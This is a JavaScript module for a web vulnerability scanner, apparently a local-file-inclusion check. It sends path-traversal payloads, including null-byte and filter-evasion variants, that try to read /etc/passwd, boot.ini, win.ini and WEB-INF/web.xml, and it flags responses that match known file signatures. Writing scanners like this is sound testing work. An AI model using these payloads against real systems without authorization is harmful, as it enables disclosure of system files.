var module = {	
  name: "Local File Include Checks",
  category: "Injection Modules",
  differential: true
};

var repeat = function(times, pattern) {
  return (new Array(times + 1)).join(pattern);
};

var checkResponse = function(ctx, currentIndex) {
	if (currentIndex === alteredRequests.length - 1) {
		if (!ctx.isFingerprintMatch(currentIndex, ctx.getOrigResponse().fingerprint)) {
			var result = {
					detected: true,
					type: "differential-lfi"
			};
			ctx.responseChecks(currentIndex);
		} else {
			var result = {
					detected: false,
					type: ""
			};
		}
		return result;
	} else {
		var passwdMatch = /root:.:0:0/; 
		var bootiniMatch = "[boot loader]";
		var wininiMatch = "; for 16-bit app support";
		
		var javaMatch = "<web-app";
		if (passwdMatch.test(ctx.getSavedResponse(currentIndex).bodyAsString)) {
			ctx.addRegexCaseInsensitiveHighlight("root:.:0:0");
			var result = {
					detected: true,
					type: "lfi"
			};
			return result;
		} else if (ctx.getSavedResponse(currentIndex).bodyAsString.indexOf(bootiniMatch) >= 0) {
			ctx.addStringHighlight(bootiniMatch);
			var result = {
					detected: true,
					type: "lfi"
			};
			return result;
		} else if (ctx.getSavedResponse(currentIndex).bodyAsString.indexOf(wininiMatch) >= 0) {
			ctx.addStringHighlight(wininiMatch);
			var result = {
					detected: true,
					type: "lfi"
			};
			return result;
		} else if (ctx.getSavedResponse(currentIndex).bodyAsString.indexOf(javaMatch) >= 0) {
			ctx.addStringHighlight(javaMatch);
			var result = {
					detected: true,
					type: "lfi"
			};
			return result;
		} else {
			var result = {
					detected: false,
					type: ""
			};
		  return result;
		}
	}
};

var generateAlert = function (ctx, index, type) {
	var uri = String(ctx.getSavedRequest(index).requestLine.uri);
	var uripart = uri.replace(/\?.*/, "");
	var ps = ctx.getPathState();
	
	ctx.alert("vinfo-" + type, ctx.getSavedRequest(index), ctx.getSavedResponse(index), {
		output: ctx.getSavedResponse(index).bodyAsString,
		key: "vinfo-lfi:" + uripart + ps.getFuzzableParameter().name,
		resource: uripart
	});
};

// Sequences are the number of directory traversal sequences to pre-pended to the request
var javaSequences = [1, 3, 4, 5];

var sequenceGenerator = function(number, type) {
	if (type == "Windows") {
	  var pattern = "..\\";
	} else if (type == "Evasion1") {
		var pattern = "....//";
	} else if (type == "Evasion2") {
		var pattern = "....\\\\";
	} else {
	  var pattern = "../";
	}	
	return repeat(number, pattern);
};

var alteredRequests = [];

// Linux
alteredRequests.push({
	payload: "/" + sequenceGenerator(12) + "etc/passwd",
	type: "Linux"
});

alteredRequests.push({
	payload: "/" + sequenceGenerator(12) + "etc/passwd\0",
	type: "Linux"
});

alteredRequests.push({
	payload: "/etc/passwd",
	type: "Linux"
});

alteredRequests.push({
	payload: "/etc/passwd\0",
	type: "Linux"
});

alteredRequests.push({
	payload: "file:/etc/passwd",
	type: "Linux"
});

alteredRequests.push({
	payload: "file:/etc/passwd\0",
	type: "Linux"
});

alteredRequests.push({
	payload: sequenceGenerator(12, "Windows") + "etc\\passwd",
	type: "Linux"
});

alteredRequests.push({
	payload: "\\" + sequenceGenerator(12, "Windows") + "etc\\passwd",
	type: "Linux"
});

alteredRequests.push({
	payload: "file:" + sequenceGenerator(12, "Windows") + "etc\\passwd",
	type: "Linux"
});

alteredRequests.push({
	payload: "file:\\" + sequenceGenerator(12, "Windows") + "etc\\passwd",
	type: "Linux"
});

alteredRequests.push({
	payload: sequenceGenerator(12, "Evasion1") + "etc/passwd",
	type: "Linux"
});

alteredRequests.push({
	payload: "/" + sequenceGenerator(12, "Evasion1") + "etc/passwd",
	type: "Linux"
});

alteredRequests.push({
	payload: "//../" + sequenceGenerator(12, "Evasion1") + "etc/passwd",
	type: "Linux"
});

alteredRequests.push({
	payload: sequenceGenerator(12, "Evasion2") + "etc\\passwd",
	type: "Linux"
});

alteredRequests.push({
	payload: "\\" + sequenceGenerator(12, "Evasion2") + "etc\\passwd",
	type: "Linux"
});

alteredRequests.push({
	payload: "\\\\..\\" + sequenceGenerator(12, "Evasion2") + "etc\\passwd",
	type: "Linux"
});

// Windows

alteredRequests.push({
	payload: "C:\\boot.ini",
	type: "Windows"
});

alteredRequests.push({
	payload: "C:/boot.ini",
	type: "Windows"
});

alteredRequests.push({
	payload: sequenceGenerator(12, "Windows") + "boot.ini",
	type: "Windows"
});

alteredRequests.push({
	payload: "file:/C:/boot.ini",
	type: "Windows"
});

alteredRequests.push({
	payload: "file:/C:\\boot.ini",
	type: "Windows"
});

alteredRequests.push({
	payload: "file:/boot.ini",
	type: "Windows"
});

alteredRequests.push({
	payload: "C:/windows/win.ini"
});

alteredRequests.push({
	payload: "C:\\windows\\win.ini"
});

alteredRequests.push({
	payload: "file:/C:/windows/win.ini",
	type: "Windows"
});

alteredRequests.push({
	payload: "file:/C:/windows/win.ini",
	type: "Windows"
});

alteredRequests.push({
	payload: sequenceGenerator(12, "Windows") + "/windows/win.ini",
	type: "Windows"
});

// Tomcat

alteredRequests.push({
	payload: sequenceGenerator(2) + "WEB-INF/web.xml",
	type: "Java"
});

alteredRequests.push({
	payload: "/" + sequenceGenerator(2) + "WEB-INF/web.xml",
	type: "Java"
});

alteredRequests.push({
	payload: sequenceGenerator(2, "Windows") + "WEB-INF\\web.xml",
	type: "Java"
});

alteredRequests.push({
	payload: "\\" + sequenceGenerator(2, "Windows") + "WEB-INF\\web.xml",
	type: "Java"
});

alteredRequests.push({
	payload: sequenceGenerator(2, "Windows") + "WEB-INF/web.xml",
	type: "Java"
});

alteredRequests.push({
	payload: "WEB-INF/web.xml",
	type: "Java"
});

alteredRequests.push({
	payload: "/WEB-INF/web.xml",
	type: "Java"
});

alteredRequests.push({
	payload: "WEB-INF\\web.xml",
	type: "Java"
});

alteredRequests.push({
	payload: "\\WEB-INF\\web.xml",
	type: "Java"
});
alteredRequests.push({
	payload: sequenceGenerator(2, "Evasion1") + "WEB-INF/web.xml",
	type: "Java"
});

alteredRequests.push({
	payload: "/" + sequenceGenerator(2, "Evasion1") + "WEB-INF/web.xml",
	type: "Java"
});

alteredRequests.push({
	payload: "//.." + sequenceGenerator(2, "Evasion1") + "WEB-INF/web.xml",
	type: "Java"
});

// Brute-force

for (var k = 0; k < javaSequences.length; k++) {
	alteredRequests.push({
			payload: "/" + sequenceGenerator(javaSequences[k]) + "WEB-INF/web.xml",
			type: "Java"
	});
}

for (var k = 0; k < javaSequences.length; k++) {
	alteredRequests.push({
			payload: "\\" + sequenceGenerator(javaSequences[k], "Windows") + "WEB-INF\\web.xml",
			type: "Java"
	});
}

// Path fingerprint requests must go last
alteredRequests.push({
	payload: "/./",
	type: "Path Fingerprint"
});

function initialize(ctx) {
	var ps = ctx.getPathState();
	if (ps.isParametric()) {
	  ctx.submitAlteredRequest(process, alteredRequests[0].payload, false, 0);
          ps.incrementFuzzCounter();
        }
	
};

function process(req, res, ctx) {
	if (ctx.hasModuleFailed()) return;
	
	if (res.fetchFail) {
    ctx2.error(req, res, "During command injection checks");
    ctx2.setModuleFailed();
    return;
  }
	
	var ps = ctx.getPathState();
	var currentIndex = ctx.getCurrentIndex();
	ctx.addRequestResponse(req, res);
  ctx.incrementResponseCount();
  
  var result = checkResponse(ctx, currentIndex);
  if (result.detected) {
  	generateAlert(ctx, currentIndex, result.type);
  } else {
  	if (currentIndex + 1 < alteredRequests.length) {
			ctx.submitAlteredRequest(process, alteredRequests[currentIndex + 1].payload, false, currentIndex + 1);
		}
  }
  
  if (ctx.allResponsesReceived()) {
		ps.decrementFuzzCounter();
	}

};
